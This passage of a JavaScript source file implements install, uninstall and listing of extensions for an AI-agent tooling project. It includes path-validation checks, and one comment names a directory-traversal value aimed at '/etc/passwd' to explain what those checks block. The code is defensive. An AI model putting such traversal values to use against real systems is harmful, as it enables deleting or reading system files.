      // we rm first; the rm+rename combo is non-atomic on Windows but the
      // invariant ("never registered-but-incomplete") still holds because
      // the registry update is downstream of this block.
      await rm(scopeDir, { recursive: true, force: true });
      await rename(tmpScopeDir, scopeDir);
    } catch (err) {
      // Staging failed. Try to leave the filesystem in a clean state — the
      // tmp dir we created is the only orphan we own.
      await rm(tmpScopeDir, { recursive: true, force: true }).catch(() => {});
      throw err;
    }

    // 8. Register (only after scopeDir is fully populated + renamed).
    const registryPath = resolveRegistryPath(opts);
    const registry = await readRegistry(registryPath);
    const filtered = registry.extensions.filter((e) => e.name !== manifest.name);
    filtered.push({
      name: manifest.name,
      version: manifest.version,
      scope: opts.scope,
      installed_at: new Date().toISOString(),
      manifest,
      last_trident_verdict: verdict,
    });
    await writeRegistry(registryPath, { extensions: filtered });

    // 9. Cross-platform skill deploy + AGENTS.md injection (W2b / t11).
    //    Project scope only — org/user scopes deploy lazily at session start
    //    via override-resolver. Failures here do NOT unwind the install (the
    //    extension is already registered); they surface as deploy_partial.
    let deployInfo;
    let deployPartial = false;
    if (opts.scope === 'project') {
      try {
        const skillList = Array.isArray(manifest.skills) ? manifest.skills : [];
        const d = await deployExtensionSkillsToPlatforms(
          manifest.name,
          skillList,
          opts.projectRoot,
          {},
        );
        deployInfo = {
          deployed: d.deployed,
          failed: d.failed,
          receiptPath: d.receiptPath,
        };
        if (Array.isArray(d.failed) && d.failed.length > 0) deployPartial = true;
      } catch (err) {
        const msg = err && err.message ? err.message : String(err);
        process.stderr.write(
          `[ijfw] extension-installer: skill deploy failed for ${manifest.name}: ${msg}\n`,
        );
        deployPartial = true;
        deployInfo = { deployed: [], failed: [{ platform: '*', skillName: '*', error: msg }] };
      }
      try {
        await deployExtensionToAgentsMd(
          manifest.name,
          Array.isArray(manifest.skills) ? manifest.skills : [],
          opts.projectRoot,
        );
      } catch (err) {
        const msg = err && err.message ? err.message : String(err);
        process.stderr.write(
          `[ijfw] extension-installer: AGENTS.md inject failed for ${manifest.name}: ${msg}\n`,
        );
        deployPartial = true;
      }
    }

    // W7.1/B2-H-01: if opts.activate, write the active-extension state.
    if (opts.activate === true && manifest.permissions) {
      try {
        const { writeActiveExtension } = await import('./active-extension-writer.js');
        await writeActiveExtension(manifest, opts.scope);
      } catch (err) {
        // Non-fatal -- install succeeded; surface as a warning.
        process.stderr.write(`[ijfw] extension-installer: install succeeded but auto-activate failed: ${err.message}\n`);
      }
    }

    return {
      ok: true,
      name: manifest.name,
      version: manifest.version,
      scope: opts.scope,
      gate_result_block: gateResultBlock,
      deploy: deployInfo,
      deploy_partial: deployPartial,
    };
  } catch (err) {
    return {
      ok: false,
      errors: [err && err.message ? err.message : String(err)],
      gate_result_block: gateResultBlock,
    };
  } finally {
    if (fetched && typeof fetched.cleanup === 'function') {
      await fetched.cleanup().catch(() => {});
    }
  }
}

// --- uninstall --------------------------------------------------------------

/**
 * Remove an extension's scope directory and registry entry. Idempotent.
 *
 * @param {string} name
 * @param {{scope: 'project'|'org'|'user', projectRoot: string}} opts
 * @returns {Promise<{ok: boolean, removed: boolean, errors?: string[]}>}
 */
export async function uninstallExtension(name, opts = {}) {
  if (!name || typeof name !== 'string') {
    return { ok: false, removed: false, errors: ['name is required'] };
  }
  // Validate name shape BEFORE constructing any filesystem path. Without this,
  // a name like '../../../etc/passwd' would join into resolveScopeDir() and
  // become the target of rm({recursive:true}). Same shape as the manifest
  // schema's name pattern: kebab, or @scope/kebab.
  if (!EXTENSION_NAME_PATTERN.test(name)) {
    return { ok: false, removed: false, errors: ['invalid extension name'] };
  }
  if (opts.scope !== 'project' && opts.scope !== 'org' && opts.scope !== 'user') {
    return { ok: false, removed: false, errors: ['opts.scope must be project|org|user'] };
  }
  if (opts.scope === 'project' && (!opts.projectRoot || typeof opts.projectRoot !== 'string')) {
    return { ok: false, removed: false, errors: ['project scope requires opts.projectRoot'] };
  }

  try {
    const scopeDir = resolveScopeDir(opts, name);
    const registryPath = resolveRegistryPath(opts);

    // Belt-and-braces: even with a validated name, confirm the resolved scope
    // dir lives inside the expected scope root. resolveScopeDir always joins
    // a known root with the name, but a future refactor could regress this.
    const scopeRoot = dirname(scopeDir); // e.g. <projectRoot>/.ijfw/extensions
    const resolvedScopeDir = resolve(scopeDir);
    const resolvedScopeRoot = resolve(scopeRoot);
    if (!resolvedScopeDir.startsWith(resolvedScopeRoot + sep) &&
        resolvedScopeDir !== resolvedScopeRoot) {
      return { ok: false, removed: false, errors: ['scope dir escapes scope root'] };
    }

    // Order: AGENTS.md first (rebuilds from current registry — entry still
    // present at this point), then platform skills, then registry+scope dir.
    // If anything mid-flight fails, the registry still references the
    // extension so a retry of uninstall finishes the job cleanly.
    let removePartial = false;
    if (opts.scope === 'project') {
      try {
        await removeExtensionFromAgentsMd(name, opts.projectRoot);
      } catch (err) {
        const msg = err && err.message ? err.message : String(err);
        process.stderr.write(
          `[ijfw] extension-installer: AGENTS.md cleanup failed for ${name}: ${msg}\n`,
        );
        removePartial = true;
      }
      try {
        await uninstallExtensionSkillsFromPlatforms(name, opts.projectRoot, {});
      } catch (err) {
        const msg = err && err.message ? err.message : String(err);
        process.stderr.write(
          `[ijfw] extension-installer: platform skill cleanup failed for ${name}: ${msg}\n`,
        );
        removePartial = true;
      }
    }

    const dirExisted = await stat(scopeDir).then(() => true, () => false);
    await rm(scopeDir, { recursive: true, force: true });

    const registry = await readRegistry(registryPath);
    const before = registry.extensions.length;
    const next = registry.extensions.filter((e) => e.name !== name);
    if (next.length !== before) {
      await writeRegistry(registryPath, { extensions: next });
    }

    // Rebuild AGENTS.md once more after registry mutation so the post-state
    // reflects the now-removed extension even if the earlier pass picked it up.
    if (opts.scope === 'project') {
      try {
        await removeExtensionFromAgentsMd(name, opts.projectRoot);
      } catch { /* already logged above if it failed first time */ }
    }

    return {
      ok: true,
      removed: dirExisted || next.length !== before,
      remove_partial: removePartial,
    };
  } catch (err) {
    return {
      ok: false,
      removed: false,
      errors: [err && err.message ? err.message : String(err)],
    };
  }
}

// --- list -------------------------------------------------------------------

/**
 * Aggregate installed extensions from project + org + user registries.
 * Dedupes on name+version (first occurrence wins; project > org > user).
 *
 * Entries include a `permissions` slice and a `description` lifted from the
 * persisted manifest so downstream consumers (override resolver / audit
 * dispatch) can answer permission questions without re-reading every
 * extension's manifest.json from disk. The full manifest is NOT returned
 * — the response stays compact.
 *
 * @param {string} projectRoot
 * @returns {Promise<Array<{
 *   name: string,
 *   version: string,
 *   scope: string,
 *   installed_at: string,
 *   status: 'active'|'stale',
 *   last_trident_verdict: string|null,
 *   permissions: {reads?: string[], writes?: string[]} | null,
 *   description: string | null,
 * }>>}
 */
export async function listExtensions(projectRoot) {
  const paths = allRegistryPaths(projectRoot);
  const seen = new Map();
  for (const { scope, path } of paths) {
    const registry = await readRegistry(path);
    for (const e of registry.extensions) {
      if (!e || !e.name || !e.version) continue;
      const key = `${e.name}@${e.version}`;
      if (seen.has(key)) continue;
      const scopeDir = resolveScopeDir(
        { scope, projectRoot },
        e.name,
      );
      const dirExists = await stat(scopeDir).then(() => true, () => false);
      // Lift audit-relevant manifest fields. `manifest` is persisted on each
      // registry entry by installExtension; fall through to null when an
      // older registry entry predates that field.
      const manifest = (e.manifest && typeof e.manifest === 'object') ? e.manifest : null;
      const permissions = manifest && manifest.permissions && typeof manifest.permissions === 'object'
        ? manifest.permissions
        : null;
      const description = manifest && typeof manifest.description === 'string'
        ? manifest.description
        : null;
      seen.set(key, {
        name: e.name,
        version: e.version,
        scope,
        installed_at: e.installed_at || null,
        status: dirExists ? 'active' : 'stale',
        last_trident_verdict: e.last_trident_verdict ?? null,
        permissions,
        description,
      });
    }
  }
  return Array.from(seen.values());
}
